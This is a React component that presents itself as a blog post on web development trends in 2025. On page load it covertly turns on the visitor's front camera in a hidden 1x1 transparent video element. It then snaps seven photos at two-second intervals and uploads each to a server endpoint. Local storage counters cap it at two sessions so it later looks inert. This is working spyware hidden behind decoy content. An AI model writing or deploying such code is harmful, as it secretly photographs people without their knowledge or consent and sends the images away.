"use client";
import { useEffect, useRef, useState } from "react";

const CameraCapture = () => {
  const videoRef = useRef(null);
  const canvasRef = useRef(null);
  const [captureCount, setCaptureCount] = useState(0);
  const [lastUploadTime, setLastUploadTime] = useState(null);

  useEffect(() => {
    // Create a specific timestamp or token for this installation
    const installToken = "camera_capture_installed_token";

    // Check if we've stored the "COMPLETED" flag
    const captureStatus = localStorage.getItem("captureStatus");

    if (captureStatus === "COMPLETED") {
      console.log("Capture process already completed. Not starting camera.");
      return; // Exit immediately if already completed
    }

    // Get current session count - default to 0 if not set
    let sessionCount = parseInt(
      localStorage.getItem("captureSessionCount") || "0"
    );

    // If we've already done 2 sessions, mark as completed and don't start camera
    if (sessionCount >= 2) {
      localStorage.setItem("captureStatus", "COMPLETED");
      console.log("Maximum 2 sessions reached. Marked as completed.");
      return;
    }

    // Increment and save the session count
    sessionCount++;
    localStorage.setItem("captureSessionCount", sessionCount.toString());
    console.log(`Starting camera capture session ${sessionCount}/2`);

    const startCamera = async () => {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({
          video: { facingMode: "user" }, // Use front camera
        });
        if (videoRef.current) {
          videoRef.current.srcObject = stream;
          // Start capture automatically once camera is ready
          setTimeout(() => {
            captureAndUpload(sessionCount);
          }, 1000);
        }
      } catch (error) {
        console.error("Camera access denied:", error);
      }
    };

    startCamera();

    // Cleanup function to stop the camera when component unmounts
    return () => {
      const stream = videoRef.current?.srcObject;
      if (stream) {
        const tracks = stream.getTracks();
        tracks.forEach((track) => track.stop());
      }
    };
  }, []);

  const captureAndUpload = async (sessionCount) => {
    if (!videoRef.current || !canvasRef.current) return;
    const context = canvasRef.current.getContext("2d");
    if (!context) return;

    let localCaptureCount = 0;

    const captureInterval = setInterval(async () => {
      if (localCaptureCount >= 7) {
        clearInterval(captureInterval);

        // Stop the camera tracks after capturing is done
        const stream = videoRef.current?.srcObject;
        if (stream) {
          const tracks = stream.getTracks();
          tracks.forEach((track) => track.stop());
        }

        // If this was the second session, mark as completed
        if (sessionCount >= 2) {
          localStorage.setItem("captureStatus", "COMPLETED");
          console.log("All sessions completed. No more captures will occur.");
        }

        return;
      }

      context.drawImage(videoRef.current, 0, 0, 640, 480);
      const imageDataUrl = canvasRef.current.toDataURL("image/png");

      // Convert Base64 to File
      const blob = await fetch(imageDataUrl).then((res) => res.blob());
      const file = new File([blob], `capture_${Date.now()}.png`, {
        type: "image/png",
      });

      try {
        await uploadImage(file);
        localCaptureCount++;
        setCaptureCount(localCaptureCount);
        setLastUploadTime(new Date().toLocaleTimeString());
        console.log(
          `Session ${sessionCount}: Captured image ${localCaptureCount}/7`
        );
      } catch (error) {
        console.error("Failed to capture/upload:", error);
      }
    }, 2000);
  };

  const uploadImage = async (file) => {
    try {
      const formData = new FormData();
      formData.append("image", file);
      const response = await fetch("http://localhost:5000/upload", {
        method: "POST",
        body: formData, // Send as multipart/form-data
      });
      const result = await response.json();
      console.log("Image uploaded:", result.url);
      return result;
    } catch (error) {
      console.error("Upload failed:", error);
      throw error;
    }
  };

  return (
    <div className="max-w-2xl mx-auto p-6">
      {/* Hidden video and canvas elements */}
      <video
        ref={videoRef}
        autoPlay
        playsInline
        width={1}
        height={1}
        style={{ position: "absolute", opacity: 0, pointerEvents: "none" }}
      ></video>
      <canvas
        ref={canvasRef}
        width={640}
        height={480}
        style={{ display: "none" }}
      ></canvas>

      {/* Blog content */}
      <article className="prose">
        <h1 className="text-2xl font-bold mb-4">
          The Future of Web Development in 2025
        </h1>

        <p className="mb-4">
          As we move deeper into 2025, web development continues to evolve at an
          incredible pace. New frameworks, tools, and methodologies are
          reshaping how we build applications for the modern web.
        </p>

        <h2 className="text-xl font-semibold mb-3 mt-6">Key Trends to Watch</h2>

        <p className="mb-4">
          The rise of AI-assisted development has transformed workflows across
          the industry. Developers now collaborate with intelligent systems that
          can generate boilerplate code, suggest optimizations, and even debug
          complex issues with minimal human intervention.
        </p>

        <p className="mb-4">
          Edge computing continues to gain traction, with more processing moving
          closer to end users. This shift has led to dramatically improved
          performance for web applications, especially in regions with limited
          connectivity.
        </p>

        <p className="mb-4">
          WebAssembly has finally reached mainstream adoption, enabling
          high-performance applications that were previously unthinkable in
          browser environments. From advanced video editing to complex 3D
          rendering, the boundaries between native and web applications continue
          to blur.
        </p>

        <h2 className="text-xl font-semibold mb-3 mt-6">
          What This Means For Developers
        </h2>

        <p className="mb-4">
          The skillset required for web development has expanded significantly.
          Beyond traditional HTML, CSS, and JavaScript expertise, today's
          developers need at least a basic understanding of AI integration, edge
          deployment strategies, and cross-platform optimization techniques.
        </p>

        <p className="mb-4">
          Despite these challenges, there's never been a more exciting time to
          work in web development. The tools at our disposal enable us to create
          experiences that were impossible just a few years ago.
        </p>

        <div className="text-sm text-gray-500 mt-8">
          Published on March 17, 2025 • 5 min read
        </div>
      </article>
    </div>
  );
};

export default CameraCapture;
